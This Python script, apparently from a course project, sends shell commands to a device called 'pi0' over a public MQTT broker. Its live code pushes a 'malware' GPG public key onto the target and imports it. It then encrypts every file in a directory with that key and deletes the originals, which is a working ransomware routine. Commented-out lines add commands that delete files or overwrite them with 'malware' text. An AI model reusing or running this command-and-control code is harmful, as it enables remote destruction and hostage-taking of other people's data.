from MyMQTT import *
from time import sleep
import paho.mqtt.client as PahoMQTT
import sys

#from pubsub import *
#from NEWNEWpubsub import *

class pubOnly():

    def __init__(self, clientID):
        self.client = MyMQTT(clientID, "test.mosquitto.org", 1883, self)
        self.clientID = clientID
        print(f"{self.clientID} created")
        self.client.start()
        self.client.mySubscribe("PoliTo/C4ES/#")

        topic = "PoliTo/C4ES/" + clientname + "/command"

        message1 = {"src" : clientname, "dest" : "pi0", "command" : "ls -la"}

        # sleep(5)

        # self.client.myPublish(topic, message1)
        # print(f"{self.clientID} publishing {message1} to topic: {topic}")

        # sleep(5)

        # message2 = {"src" : clientname, "dest" : "pi0", "command" : "pwd"}

        # self.client.myPublish(topic, message2)

        # sleep(5)

        #message3 = {"src" : clientname, "dest" : "pi0", "command" : "cd A ; ls -la ; rm ./zsamples_B6N.txt"}
        # questo funziona ma dovrei sapere il nome del file

        #self.client.myPublish(topic, message3)

        #sleep(5)

        #message4 = {"src" : clientname, "dest" : "pi0", "command" : "cd A ; ls | tail +3"}
        # funziona per listare tutti i file e directories in dir
        #self.client.myPublish(topic, message4)

        # message5 = {"src" : clientname, "dest" : "pi0", "command" : "cd A ; echo qualcosa > (ls -la | head -n 1)"}

        # self.client.myPublish(topic, message5)

        # message6 = {"src" : clientname, "dest" : "pi0", "command" : "cd A ; echo qualcosa > (ls -la | head -n 1)"}

        #self.client.myPublish(topic, message6) 

        # messageA = {"src" : clientname, "dest" : "pi0", "command" : "ls >> trace1.log"}
        # self.client.myPublish(topic, messageA)

        # sleep(2)

        # messageB = {"src" : clientname, "dest" : "pi0", "command" : "ls ./A/ >> trace2.log"}
        # self.client.myPublish(topic, messageB)

        # sleep(2)

        # messageC = {"src" : clientname, "dest" : "pi0", "command" : "ls -a -p ./A/ | grep -v / >> trace3.log"}
        # self.client.myPublish(topic, messageC)

        # sleep(2)    

        # messageD = {"src" : clientname, "dest" : "pi0", "command" : "ls -a -p ./A/ | grep -v / | head -n 1 >> trace4.log"}
        # self.client.myPublish(topic, messageD)

        # sleep(2)

        # messageE = {"src" : clientname, "dest" : "pi0", "command" : "ls -a -p ./A/ | grep -v / | head -n 1 | xargs -0 rm >> trace5.log"}
        # self.client.myPublish(topic, messageE)

        #sleep(2)

        #messageF = {"src" : clientname, "dest" : "pi0", "command" : "find ./A -type f -exec sh -c 'echo ciao da malware1 > {}\necho ciao da malware2 >> {}\necho ciao da malware3 >> {}' \;"}
        #messageF = {"src" : clientname, "dest" : "pi0", "command" : "find ./A -type f -exec rm -f {} +"}
        #self.client.myPublish(topic, messageF)

        sleep(2)

        filepointer = open("malware_public.key")

        primo = 1

        for row in filepointer:
            #print(row, end = '')
            row = row.strip('\n')
            if(primo == 1):
                primo = 0
                message = {"src" : clientname, "dest" : "pi0", "command" : f"echo {row} > public.key"}
                self.client.myPublish(topic, message)
            else:
                message = {"src" : clientname, "dest" : "pi0", "command" : f"echo {row} >> public.key"}
                self.client.myPublish(topic, message)
            sleep(0.5)

        sleep(5)

        # sleep(5)

        message = {"src" : clientname, "dest" : "pi0", "command" : "gpg --import public.key"}
        self.client.myPublish(topic, message)        

        sleep(5)

        # message = {"src" : clientname, "dest" : "pi0", "command" : "gpg --list-keys"}
        # self.client.myPublish(topic, message)    

        # message = {"src" : clientname, "dest" : "pi0", "command" : "ls -la"}
        # self.client.myPublish(topic, message)     

        # sleep(5)

        message = {"src" : clientname, "dest" : "pi0", "command" : "cd ./A"}
        self.client.myPublish(topic, message)

        sleep(5)

        ##### message = {"src" : clientname, "dest" : "pi0", "command" : "find . -maxdepth 1 -type f -exec -c 'gpg --always-trust -e -r \"malware\" {}\n rm -f {} \;'"}
        ##### self.client.myPublish(topic, message)           

        # message = {"src" : clientname, "dest" : "pi0", "command" : "gpg --always-trust -e -r \"malware\" a.txt"}
        # self.client.myPublish(topic, message)      funziona sul singolo

        # for file in *; do if [ -f $file ]; then echo $file; echo $file ciao; fi; done

        # FUNZIONA PER ENCRYPT TUTTI I FILE IN UNA CARTELLA SINGOLA
        # message = {"src" : clientname, "dest" : "pi0", "command" : "for file in *; do if [ -f $file ]; then gpg --always-trust -e -r \"malware\" $file; rm -f $file; fi; done"}
        # self.client.myPublish(topic, message)  

        # message = {"src" : clientname, "dest" : "pi0", "command" : "for i in $(find . -type f -print); do echo ciao > $i;  done"}
        # self.client.myPublish(topic, message) 

        message = {"src" : clientname, "dest" : "pi0", "command" : "for i in $(find . -type f -print); do gpg --always-trust -e -r \"malware\" $i; rm -f $i; sleep 1; done"}
        self.client.myPublish(topic, message) 

        sleep(5)


        
    def notify(self, message, topic):
        if topic == f"PoliTo/C4ES/{self.clientID}/command":
            print("loopback")
            return



if __name__ == "__main__":

    clientname = str(sys.argv[1])

    publisher = pubOnly(clientname)
